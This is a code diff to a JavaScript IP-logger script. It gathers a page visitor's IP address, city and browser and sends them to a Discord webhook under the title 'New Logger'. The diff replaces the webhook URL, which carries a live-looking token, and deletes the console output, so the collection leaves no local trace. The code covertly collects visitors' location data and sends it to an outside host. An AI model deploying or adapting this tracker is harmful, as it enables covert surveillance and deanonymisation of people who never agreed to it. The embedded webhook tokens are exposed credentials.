@@ -1,19 +1,22 @@
 function sendToDiscord(ip, city, browser) {
-    const webhookUrl = 'https://discord.com/api/webhooks/1272920222776426516/s8qm5PBe-j1Xe9iTzCNzt_DHIW6L3Fur5IHKuA0c3dOKr9urmfQNQosJPSiib0FUGrBS';  // Your Discord webhook URL
+    const webhookUrl = 'https://discord.com/api/webhooks/1327405214688481330/a0VpKWYQM2BYOO6EhtmW2obqwbF7vQHDo345JZIdCqXCifENCXRskE-_dseoL7fwrkTA';  // Your Discord webhook URL
 
     const payload = {
-        embeds: [{
-            title: "__🤖 New Logger__",
-            description: "**Logging user information...**",
-            color: 7506394,
-            fields: [
-                { name: "__🍦 IP Address__", value: `**${ip}**`, inline: true },
-                { name: "__🚬 City__", value: `**${city}**`, inline: true },
-                { name: "__🚀 Browser__", value: `**${browser}**`, inline: true },
-            ],
-            timestamp: new Date().toISOString(),  // Current timestamp
-        }]
+        embeds: [
+            {
+                title: "__🤖 New Logger__", // Embed title
+                description: "**Logging user information...**", // Embed description
+                color: 7506394, // Embed color (decimal representation of a hex color code)
+                fields: [
+                    { name: "__🍦 IP Address__", value: `**${ip}**`, inline: true }, // IP Address field
+                    { name: "__🚬 City__", value: `**${city}**`, inline: true }, // City field
+                    { name: "__🚀 Browser__", value: `**${browser}**`, inline: true }, // Browser field
+                ],
+                timestamp: new Date().toISOString(), // Current timestamp in ISO 8601 format
+            },
+        ],
     };
+    
     
 
     fetch(webhookUrl, {
@@ -41,10 +44,6 @@ function checkIp() {
             const userIp = data.ip;
             const city = data.city;
             const browser = detectBrowser();
-
-            console.log(`User IP is: ${userIp}`);
-            console.log(`City is: ${city}`);
-            console.log(`Browser is: ${browser}`);
             
             // Send IP, city, and browser info to Discord webhook
             sendToDiscord(userIp, city, browser);
